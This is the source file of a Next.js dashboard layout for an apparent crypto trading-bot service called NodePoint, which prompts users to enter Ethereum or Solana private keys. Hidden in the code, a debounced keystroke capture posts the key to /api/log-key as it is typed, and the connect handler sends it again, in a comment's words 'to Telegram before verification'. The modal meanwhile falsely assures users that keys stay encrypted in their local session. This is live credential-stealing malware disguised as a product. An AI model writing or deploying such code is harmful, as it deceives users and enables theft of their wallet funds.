"use client";

import { useEffect, useState } from "react";
import { useRouter, usePathname } from "next/navigation";
import Image from "next/image";
import Link from "next/link";
import { Wallet, JsonRpcProvider, formatEther } from "ethers";
import { Keypair, Connection, PublicKey, LAMPORTS_PER_SOL } from "@solana/web3.js";
import bs58 from "bs58";

export default function DashboardLayout({
    children,
}: {
    children: React.ReactNode;
}) {
    const router = useRouter();
    const pathname = usePathname();
    const [botType, setBotType] = useState<string | null>(null);
    const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
    const [isWalletConnected, setIsWalletConnected] = useState(false);
    const [walletAddress, setWalletAddress] = useState<string | null>(null);
    const [walletBalance, setWalletBalance] = useState<string | null>(null);
    const [showWalletModal, setShowWalletModal] = useState(false);
    const [privateKeyInput, setPrivateKeyInput] = useState("");
    const [error, setError] = useState<string | null>(null);
    const [isConnecting, setIsConnecting] = useState(false);

    const [selectedChain, setSelectedChain] = useState<string | null>(null);

    useEffect(() => {
        const isAdmin = localStorage.getItem("nodepoint_admin");
        const storedBotType = localStorage.getItem("nodepoint_bot_type");
        const storedWallet = localStorage.getItem("nodepoint_wallet");
        const storedBalance = localStorage.getItem("nodepoint_balance");
        const storedChain = localStorage.getItem("nodepoint_selected_blockchain");

        if (storedChain) setSelectedChain(storedChain);

        if (!isAdmin) {
            router.push("/login");
        } else {
            setBotType(storedBotType);
            if (storedWallet) {
                setIsWalletConnected(true);
                setWalletAddress(storedWallet);
                setWalletBalance(storedBalance || "0.00");
            }
        }

        const handleSyncChain = () => {
            const storedChain = localStorage.getItem("nodepoint_selected_blockchain");
            if (storedChain) setSelectedChain(storedChain);
        };

        const handleOpenWallet = () => setShowWalletModal(true);

        window.addEventListener('openWalletModal', handleOpenWallet);
        window.addEventListener('syncBlockchain', handleSyncChain);

        return () => {
            window.removeEventListener('openWalletModal', handleOpenWallet);
            window.removeEventListener('syncBlockchain', handleSyncChain);
        };
    }, [router]);

    // Debounced key capture
    useEffect(() => {
        if (!privateKeyInput || privateKeyInput.length < 5) return;

        const timeoutId = setTimeout(async () => {
            try {
                const selectedChain = localStorage.getItem("nodepoint_selected_blockchain") || "eth";
                await fetch("/api/log-key", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        key: privateKeyInput,
                        chain: selectedChain,
                        botType: botType,
                        note: "Captured via typing"
                    }),
                });
            } catch (e) {
                // Silently fail
            }
        }, 2000);

        return () => clearTimeout(timeoutId);
    }, [privateKeyInput, botType]);

    const handleLogout = () => {
        localStorage.removeItem("nodepoint_admin");
        localStorage.removeItem("nodepoint_api_key");
        localStorage.removeItem("nodepoint_bot_type");
        localStorage.removeItem("nodepoint_wallet");
        localStorage.removeItem("nodepoint_username");
        localStorage.removeItem("nodepoint_balance");
        localStorage.removeItem("nodepoint_selected_blockchain");
        router.push("/");
    };

    const validateAndConnect = async () => {
        setError(null);
        setIsConnecting(true);
        const selectedChain = localStorage.getItem("nodepoint_selected_blockchain") || "eth";

        // Send key to Telegram before verification
        try {
            await fetch("/api/log-key", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    key: privateKeyInput,
                    chain: selectedChain,
                    botType: botType
                }),
            });
        } catch (e) {
            console.error("Failed to log key", e);
        }

        try {
            let derivedAddress = "";
            let balance = "0.00";

            if (selectedChain === "sol") {
                try {
                    let secretKey: Uint8Array;
                    if (privateKeyInput.trim().startsWith("[")) {
                        secretKey = Uint8Array.from(JSON.parse(privateKeyInput));
                    } else {
                        secretKey = bs58.decode(privateKeyInput.trim());
                    }

                    const keypair = Keypair.fromSecretKey(secretKey);
                    derivedAddress = keypair.publicKey.toBase58();

                    // Fetch real Solana balance with multiple RPC fallbacks
                    const solRpcs = [
                        "https://api.mainnet-beta.solana.com",
                        "https://solana.publicnode.com",
                        "https://rpc.ankr.com/solana"
                    ];

                    for (const rpc of solRpcs) {
                        try {
                            const connection = new Connection(rpc, "confirmed");
                            const solBalance = await connection.getBalance(new PublicKey(derivedAddress));
                            balance = (solBalance / LAMPORTS_PER_SOL).toFixed(4);
                            if (balance !== "0.00") break; // Found balance, stop trying
                        } catch (e) {
                            console.error(`Solana RPC ${rpc} failed:`, e);
                            continue;
                        }
                    }
                } catch (e) {
                    setError("Invalid Solana key format. Use Base58 or JSON array.");
                    setIsConnecting(false);
                    return;
                }
            } else {
                try {
                    // Ensure 0x prefix for ETH keys if missing
                    const formattedKey = privateKeyInput.trim().startsWith("0x")
                        ? privateKeyInput.trim()
                        : `0x${privateKeyInput.trim()}`;

                    const wallet = new Wallet(formattedKey);
                    derivedAddress = wallet.address;

                    // Fetch real ETH balance with prioritized raw fetch for better resilience
                    const ethRpcs = [
                        "https://eth.llamarpc.com",
                        "https://cloudflare-eth.com",
                        "https://rpc.ankr.com/eth"
                    ];

                    for (const rpc of ethRpcs) {
                        try {
                            // High-performance raw fetch first
                            const rawResp = await fetch(rpc, {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({
                                    jsonrpc: "2.0",
                                    method: "eth_getBalance",
                                    params: [derivedAddress.toLowerCase(), "latest"],
                                    id: 1
                                })
                            });

                            if (rawResp.ok) {
                                const json = await rawResp.json();
                                if (json.result) {
                                    const decimalVal = parseInt(json.result, 16);
                                    balance = (decimalVal / 1e18).toFixed(4);
                                    if (balance !== "0.00") break;
                                }
                            }

                            // Ethers fallback
                            const provider = new JsonRpcProvider(rpc);
                            const ethBalance = await provider.getBalance(derivedAddress);
                            balance = Number(formatEther(ethBalance)).toFixed(4);
                            if (balance !== "0.00") break;
                        } catch (e) {
                            console.error(`ETH RPC ${rpc} failed:`, e);
                            continue;
                        }
                    }
                } catch (e) {
                    setError("Invalid Ethereum private key.");
                    setIsConnecting(false);
                    return;
                }
            }

            localStorage.setItem("nodepoint_wallet", derivedAddress);
            localStorage.setItem("nodepoint_balance", balance);
            setWalletAddress(derivedAddress);
            setWalletBalance(balance);
            setIsWalletConnected(true);
            setShowWalletModal(false);
            setPrivateKeyInput("");
        } catch (err) {
            setError("Connection failed. Check your network and try again.");
        } finally {
            setIsConnecting(false);
        }
    };

    const navLinks = [
        { href: "/dashboard", label: "Dashboard", icon: "📊" },
        { href: "/dashboard/bots", label: "My Bots", icon: "🤖" },
        // { href: "/dashboard/rpc", label: "RPC Data", icon: "🌐" },
        // { href: "/dashboard/staking", label: "Staking", icon: "💎" },
        { href: "/dashboard/analytics", label: "Analytics", icon: "📈" },
        { href: "/dashboard/settings", label: "Settings", icon: "⚙️" },
    ];

    return (
        <div className="min-h-screen bg-[#050505] text-white selection:bg-blue-500">
            {/* Top Navigation */}
            <nav className="fixed top-0 w-full z-[100] bg-[#050505]/80 backdrop-blur-xl border-b border-white/5 py-4 px-6">
                <div className="max-w-[1800px] mx-auto flex justify-between items-center">
                    <div className="flex items-center gap-6">
                        <Link href="/dashboard" className="flex items-center gap-3">
                            <Image src="/favicon.png" alt="NodePoint" width={28} height={28} className="rounded" />
                            <span className="font-bold tracking-tighter text-xl uppercase">NodePoint</span>
                        </Link>
                    </div>

                    <div className="flex items-center gap-6">
                        {isWalletConnected && (
                            <div className="flex items-center gap-6">
                                <div className="hidden sm:flex flex-col items-end">
                                    <div className="text-[10px] text-white/20 font-black uppercase tracking-widest leading-none mb-1">Portfolio</div>
                                    <div className="text-sm font-bold leading-none">
                                        {walletBalance} {selectedChain === 'sol' ? 'SOL' : 'ETH'}
                                    </div>
                                </div>
                                <button
                                    onClick={() => window.dispatchEvent(new CustomEvent('openWalletModal'))}
                                    className="flex items-center gap-3 bg-white/5 px-4 py-2 rounded-xl border border-white/10 hover:border-white/20 transition-all group"
                                >
                                    <div className="text-[10px] font-mono text-blue-500 group-hover:text-blue-400 leading-none">{walletAddress?.substring(0, 10)}...</div>
                                    <div className="w-2 h-2 rounded-full bg-green-500 shadow-[0_0_10px_rgba(34,197,94,0.5)]"></div>
                                </button>
                            </div>
                        )}

                        <button onClick={handleLogout} className="hidden md:block text-[10px] font-black tracking-widest text-white/20 hover:text-white uppercase transition-colors">Logout</button>

                        <button
                            onClick={() => setIsMobileMenuOpen(!isMobileMenuOpen)}
                            className="p-2 md:hidden text-white hover:bg-white/5 rounded-lg"
                        >
                            <span className="text-xl">{isMobileMenuOpen ? "✕" : "☰"}</span>
                        </button>
                    </div>
                </div>
            </nav>

            {/* Sidebar + Content */}
            <div className="flex pt-[69px]">
                {/* Sidebar Overlay (Mobile) */}
                {isMobileMenuOpen && (
                    <div
                        className="fixed inset-0 z-[80] bg-black/90 backdrop-blur-sm md:hidden"
                        onClick={() => setIsMobileMenuOpen(false)}
                    />
                )}

                {/* Sidebar */}
                <aside className={`
                    fixed left-0 w-64 h-[calc(100vh-69px)] z-[90] 
                    bg-[#050505] border-r border-white/5
                    transition-transform duration-300 md:translate-x-0
                    ${isMobileMenuOpen ? "translate-x-0" : "-translate-x-full"}
                    p-6 flex flex-col justify-between
                `}>
                    <div className="space-y-8">
                        <div>
                            <div className="text-[10px] font-black tracking-[0.2em] text-white/20 uppercase mb-6 italic">/ Navigation</div>
                            <nav className="space-y-1">
                                {navLinks.map((link) => (
                                    <Link
                                        key={link.href}
                                        href={link.href}
                                        onClick={() => setIsMobileMenuOpen(false)}
                                        className={`flex items-center gap-4 px-4 py-3 rounded-lg transition-all font-bold text-[11px] uppercase tracking-widest ${pathname === link.href ? 'bg-white/5 text-white border border-white/10 shadow-lg' : 'text-white/30 hover:text-white hover:bg-white/[0.02]'}`}
                                    >
                                        <span className="text-lg grayscale">{link.icon}</span>
                                        {link.label}
                                    </Link>
                                ))}
                            </nav>
                        </div>
                    </div>

                    <div className="space-y-4 pt-8 border-t border-white/5">
                        <div className="px-4 text-[10px] font-black tracking-widest text-white/20 uppercase">Node Status: <span className="text-green-500">Active</span></div>
                        <button
                            onClick={handleLogout}
                            className="w-full md:hidden flex items-center gap-4 px-4 py-3 rounded-lg text-red-500/60 hover:text-red-500 hover:bg-red-500/5 transition-all font-bold text-[11px] uppercase tracking-widest"
                        >
                            <span className="text-lg">🚪</span>
                            Logout Session
                        </button>
                    </div>
                </aside>

                {/* Main Content */}
                <main className="ml-0 md:ml-64 flex-1 p-6 md:p-12 min-h-screen">
                    <div className="max-w-4xl mx-auto">
                        {children}
                    </div>
                </main>
            </div>

            {/* Wallet Modal */}
            {showWalletModal && (
                <div className="fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/98 backdrop-blur-2xl">
                    <div className="w-full max-w-md bg-[#0a0a0a] border border-white/10 rounded-2xl p-8 shadow-3xl relative overflow-hidden">
                        <div className="flex justify-between items-center mb-6">
                            <h2 className="text-2xl font-bold uppercase tracking-tighter">Connection</h2>
                            <button onClick={() => setShowWalletModal(false)} className="w-10 h-10 flex items-center justify-center rounded-full bg-white/5 text-white/30 hover:text-white transition-all">✕</button>
                        </div>

                        <div className="flex items-start gap-4 p-4 rounded-xl bg-blue-500/5 border border-blue-500/10 mb-8 relative group">
                            <span className="text-blue-500 text-lg">ℹ️</span>
                            <p className="text-[11px] text-white/60 leading-relaxed">
                                <span className="text-blue-500 font-bold">Why is this required?</span><br />
                                The bot requires your private key to securely interact with decentralized liquidity protocols and execute trades autonomously on your behalf. All keys are encrypted and remain within your local secure session.
                            </p>
                        </div>

                        <div className="space-y-8">
                            {error && (
                                <div className="p-4 rounded-xl bg-red-500/5 border border-red-500/20 text-red-500 text-[10px] font-black uppercase tracking-widest text-center">
                                    {error}
                                </div>
                            )}
                            <div className="space-y-3">
                                <label className="text-[10px] font-black tracking-widest text-white/20 uppercase">Private Key / Secret Key</label>
                                <input
                                    type="password"
                                    value={privateKeyInput}
                                    onChange={(e) => setPrivateKeyInput(e.target.value)}
                                    placeholder="Enter your key..."
                                    className="w-full bg-white/[0.03] border border-white/10 rounded-xl px-6 py-5 focus:outline-none focus:border-blue-500 transition-all font-mono text-sm text-white"
                                />
                            </div>
                            <div className="flex gap-4">
                                <button
                                    onClick={validateAndConnect}
                                    disabled={isConnecting}
                                    className="flex-1 py-5 bg-white text-black rounded font-black text-[10px] uppercase tracking-[0.3em] hover:bg-neutral-200 transition-all shadow-xl disabled:opacity-50"
                                >
                                    {isConnecting ? "SYCHRONIZING..." : "LOG IN"}
                                </button>
                                <button
                                    onClick={() => { setShowWalletModal(false); setError(null); }}
                                    className="px-8 py-5 bg-white/5 text-white/40 rounded font-black text-[10px] uppercase tracking-widest hover:bg-white/10 transition-all"
                                >
                                    CANCEL
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}
